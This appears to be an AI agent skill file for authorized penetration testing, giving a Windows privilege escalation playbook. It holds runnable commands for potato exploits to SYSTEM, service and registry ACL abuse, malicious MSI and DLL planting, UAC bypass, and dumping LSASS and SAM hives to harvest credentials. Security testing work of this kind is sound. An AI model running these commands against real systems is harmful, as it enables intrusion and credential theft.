---
name: privesc-windows
description: Deep-dive Windows local privilege escalation — SeImpersonate/potato → SYSTEM, unquoted service paths, weak service/registry ACLs, AlwaysInstallElevated, DLL hijack, autoruns, UAC bypass, and LSASS/SAM/DPAPI credential harvest.
---

# Windows Privilege Escalation (deep dive)

Foothold host in **declared scope only**. Rank vectors by reliability and blast radius; config/ACL wins first, token/potato next, exploits last. Route loot to `$OUTPUT_DIR/loot/`.

---

## 1. Enumerate

```powershell
whoami /all          # groups + PRIVILEGES (the key line)
systeminfo           # OS build + hotfixes → missing-patch analysis
whoami /priv         # SeImpersonate / SeAssignPrimaryToken / SeBackup / SeRestore / SeDebug?
# Automated triage:
.\winPEASx64.exe > $env:TEMP\winpeas.txt
powershell -ep bypass -c "Import-Module .\PowerUp.ps1; Invoke-AllChecks"
.\Seatbelt.exe -group=all
```
Confirm every candidate by hand.

---

## 2. Token privileges → SYSTEM (most reliable on servers)

If `whoami /priv` shows **SeImpersonatePrivilege** or **SeAssignPrimaryTokenPrivilege** (default for IIS `AppPool`, MSSQL service, many service accounts):
- Use a **potato**: `PrintSpoofer` (needs spooler), `GodPotato` (broad DCOM, works on modern Win10/11 & 2016-2022), `RoguePotato`, `JuicyPotatoNG`.
```powershell
.\GodPotato.exe -cmd "cmd /c whoami"          # → nt authority\system
.\PrintSpoofer64.exe -i -c powershell.exe
```
- **SeBackupPrivilege/SeRestorePrivilege** → read SAM/SYSTEM hives or overwrite protected files. **SeDebugPrivilege** → dump LSASS / inject. **SeTakeOwnership** → own a protected file/service binary.

## 3. Service misconfigurations

```powershell
# via PowerUp: Get-ServiceUnquoted, Get-ModifiableServiceFile, Get-ModifiableService
sc.exe qc <service>            # inspect binPath + start type
accesschk.exe -uwcqv "Users" *  # services writable by low-priv groups
```
- **Unquoted service path** with spaces (`C:\Program Files\My App\svc.exe`) + a writable parent dir → plant `C:\Program.exe` or `C:\Program Files\My.exe`; restart service.
- **Weak service ACL** (`SERVICE_CHANGE_CONFIG`) → `sc config <svc> binPath= "cmd /c ..."` then `sc start`.
- **Writable service binary** → replace it, restart.

## 4. Registry / installer misconfig

- **AlwaysInstallElevated**: both HKLM & HKCU `...\Installer\AlwaysInstallElevated = 1` → run a malicious MSI as SYSTEM (`msiexec /quiet /i evil.msi`).
- Weak ACL on `HKLM\SYSTEM\CurrentControlSet\Services\<svc>` → rewrite `ImagePath`.
- **autoruns** (writable startup binary / `Run` key) → SYSTEM/admin on next logon.

## 5. DLL hijacking / search-order

A service or SYSTEM-run app loading a DLL that's missing or resolvable from a writable directory in its search path → drop a malicious DLL of that name. Confirm with Procmon (`NAME NOT FOUND` on a DLL in a writable path).

## 6. UAC bypass (medium → high integrity, same admin user)

If you're a member of Administrators but at medium integrity: `fodhelper.exe` / `computerdefaults.exe` registry hijack, or `sdclt`/DiskCleanup scheduled-task bypass. Useful to get an elevated token before further attacks. (Not a cross-user escalation.)

## 7. Missing patches / kernel (last resort)

Feed `systeminfo` to Windows Exploit Suggester (NG) to map missing hotfixes to LPEs (e.g. legacy MS16-032, SMBGhost CVE-2020-0796, PrintNightmare CVE-2021-34527, HiveNightmare/SeriousSAM CVE-2021-36934 → readable SAM). **Kernel exploits can BSOD — approval + snapshot first.**

## 8. Credential harvesting (from elevated context)

```powershell
# LSASS (needs SeDebug/SYSTEM). comsvcs is LOLBin; mimikatz is loud/AV-flagged.
rundll32 C:\Windows\System32\comsvcs.dll, MiniDump <lsass_pid> C:\Windows\Temp\l.dmp full
# then offline:  pypykatz lsa minidump l.dmp
# SAM/SYSTEM/SECURITY hives (SeBackup or SYSTEM):
reg save HKLM\SAM sam.hive & reg save HKLM\SYSTEM sys.hive & reg save HKLM\SECURITY sec.hive
# offline: impacket-secretsdump -sam sam.hive -system sys.hive -security sec.hive LOCAL
```
Also mine: **DPAPI** blobs (browser creds, RDP), **cmdkey /list** + `runas /savecred`, `C:\Windows\Panther\Unattend.xml`, IIS `web.config` connection strings, `cmdkey`, saved WiFi/PSK. NTLM hashes → pass-the-hash + feed `hunt-active-directory`.

---

## Validation & cleanup

1. Confirm SYSTEM/admin with `whoami` from a fresh process.
2. Capture vector + commands + output to `$OUTPUT_DIR/findings/finding-NNN/`; redact hashes/dumps per `evidence-hygiene`.
3. Delete dropped tooling (winpeas, potato, dumps, MSI, DLLs) and note in the report.
4. State remediation (quote service paths, tighten ACLs, disable AlwaysInstallElevated, patch, LSASS protection / Credential Guard, least-privilege service accounts).
